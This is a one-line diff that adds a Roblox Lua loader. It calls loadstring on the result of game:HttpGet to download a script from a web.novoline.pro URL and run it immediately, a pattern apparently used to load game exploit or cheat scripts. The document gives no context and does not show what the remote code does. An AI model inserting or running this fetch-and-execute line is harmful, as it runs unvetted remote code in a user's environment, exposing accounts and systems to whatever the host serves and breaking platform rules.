@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://web.novoline.pro/p/raw/294sowy8sm"))()
